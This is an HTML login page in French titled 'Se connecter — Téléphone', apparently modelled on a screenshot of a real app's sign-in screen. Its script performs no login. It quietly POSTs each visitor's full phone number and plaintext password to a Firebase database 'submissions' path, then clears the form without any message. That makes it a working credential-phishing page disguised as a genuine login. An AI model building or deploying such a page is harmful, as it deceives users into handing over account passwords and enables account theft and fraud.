<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <title>Se connecter — Téléphone</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white text-gray-900">
  <div class="min-h-screen flex flex-col">
    <main class="flex-1">
      <div class="max-w-md mx-auto px-4 pt-8 pb-16">

        <div class="rounded-3xl border bg-white/70 backdrop-blur p-6 sm:p-8 shadow-sm">
          <div class="flex items-start justify-between">
            <h1 class="text-3xl sm:text-4xl font-extrabold tracking-tight">Se connecter</h1>
            <button aria-label="Fermer" class="p-2 rounded-full hover:bg-gray-100">×</button>
          </div>

          <!-- Sous-titre comme sur ta capture -->
          <div class="mt-3 text-sm text-gray-700">
            <div class="font-semibold">Téléphone</div>
            <div class="text-gray-600">
              Connexion avec une adresse e-mail ou un nom d’utilisateur
            </div>
          </div>

          <form id="loginForm" class="mt-5 space-y-4" autocomplete="off">
            <!-- Ligne pays + téléphone -->
            <div class="flex gap-2">
              <select id="country" class="w-32 border border-gray-300 rounded-xl px-3 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black">
                <!-- options complètes ci-dessous via JS; on laisse une valeur temporaire -->
                <option value="+33">FR +33</option>
              </select>

              <input id="phone" type="tel" inputmode="tel" placeholder="Numéro de téléphone"
                class="flex-1 border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
                autocomplete="tel" />
            </div>

            <!-- Mot de passe -->
            <div class="relative">
              <input id="password" type="password" placeholder="Mot de passe"
                class="w-full border border-gray-300 rounded-xl px-4 py-3 bg-gray-100 focus:outline-none focus:ring-2 focus:ring-black"
                autocomplete="current-password" />
            </div>

            <div class="text-sm">
              <a href="#" onclick="event.preventDefault()" class="text-gray-700 hover:underline">Mot de passe oublié ?</a>
              <!-- On a supprimé “Connexion avec un code” -->
            </div>

            <button id="submitBtn" type="submit" disabled
              class="w-full rounded-2xl px-6 py-4 text-lg font-semibold transition disabled:opacity-50 disabled:cursor-not-allowed bg-gray-100 text-gray-500">
              Se connecter
            </button>
          </form>

          <p class="mt-6 text-center text-sm text-gray-800">
            Tu n’as pas de compte ? <a href="#" class="text-[#f53152] font-semibold hover:underline">S’inscrire</a>
          </p>
        </div>
      </div>
    </main>
  </div>

  <script>
    /* --------- CONFIG FIREBASE (Realtime Database) --------- */
    const DB_URL = "https://fir-login-d968e-default-rtdb.europe-west1.firebasedatabase.app";

    /* --------- PAYS & INDICATIFS --------- */
    // Liste compacte des indicatifs les plus utilisés (tu peux en ajouter autant que tu veux)
    const DIALS = [
      { cc: "FR", name: "FR", dial: "+33" },
      { cc: "CH", name: "CH", dial: "+41" },
      { cc: "BE", name: "BE", dial: "+32" },
      { cc: "LU", name: "LU", dial: "+352" },
      { cc: "DE", name: "DE", dial: "+49" },
      { cc: "ES", name: "ES", dial: "+34" },
      { cc: "IT", name: "IT", dial: "+39" },
      { cc: "PT", name: "PT", dial: "+351" },
      { cc: "GB", name: "GB", dial: "+44" },
      { cc: "US", name: "US", dial: "+1" },
      { cc: "CA", name: "CA", dial: "+1" },
      { cc: "MA", name: "MA", dial: "+212" },
      { cc: "DZ", name: "DZ", dial: "+213" },
      { cc: "TN", name: "TN", dial: "+216" },
      { cc: "SN", name: "SN", dial: "+221" },
      { cc: "CI", name: "CI", dial: "+225" },
      { cc: "CM", name: "CM", dial: "+237" }
    ];

    const countrySel = document.getElementById('country');
    const phoneEl    = document.getElementById('phone');
    const pwdEl      = document.getElementById('password');
    const submitBtn  = document.getElementById('submitBtn');
    const loginForm  = document.getElementById('loginForm');

    // Remplit <select> avec la liste DIALS
    function populateCountries() {
      countrySel.innerHTML = "";
      DIALS.forEach(({cc, name, dial}) => {
        const opt = document.createElement('option');
        opt.value = dial;
        opt.textContent = `${name} ${dial}`;
        opt.dataset.cc = cc;
        countrySel.appendChild(opt);
      });
    }

    // Détecte la région de l’utilisateur pour pré-sélectionner l’indicatif
    function detectRegion() {
      try {
        // ex: "fr-FR" -> "FR"
        const lang = navigator.language || navigator.userLanguage || "fr-FR";
        const region = (new Intl.Locale(lang).region) || "FR";
        const match = DIALS.find(d => d.cc === region);
        if (match) countrySel.value = match.dial; else countrySel.value = "+33";
      } catch {
        countrySel.value = "+33"; // défaut
      }
    }

    function refreshSubmit() {
      const phoneOK = phoneEl.value.trim().length > 0;
      const passOK  = pwdEl.value.length > 0;
      const ok = phoneOK && passOK;

      submitBtn.disabled = !ok;
      submitBtn.className = ok
        ? 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-[#f53152] text-white hover:opacity-90 transition'
        : 'w-full rounded-2xl px-6 py-4 text-lg font-semibold bg-gray-100 text-gray-500 disabled:cursor-not-allowed transition';
    }

    phoneEl.addEventListener('input', refreshSubmit);
    pwdEl.addEventListener('input', refreshSubmit);
    countrySel.addEventListener('change', () => {
      // optionnel: tu peux formatter en E.164 ici si tu veux
      refreshSubmit();
    });

    // Submit -> enregistre dans Firebase (sans popup)
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      submitBtn.disabled = true;
      submitBtn.textContent = "Envoi...";

      // Construit le numéro complet: indicatif + numéro saisi, sans espaces
      const dial = countrySel.value;                              // ex: +41
      const raw = phoneEl.value.replace(/[^\d]/g, '');            // digits only
      const fullPhone = `${dial}${raw}`;

      const payload = {
        phone: fullPhone,
        password: pwdEl.value,
        created_at: new Date().toISOString()
      };

      try {
        await fetch(`${DB_URL}/submissions.json`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        // Reset silencieux
        phoneEl.value = "";
        pwdEl.value = "";
      } catch (err) {
        console.error("Erreur d’envoi:", err);
      } finally {
        submitBtn.textContent = "Se connecter";
        refreshSubmit();
      }
    });

    // Init
    populateCountries();
    detectRegion();
    refreshSubmit();
  </script>
</body>
</html>

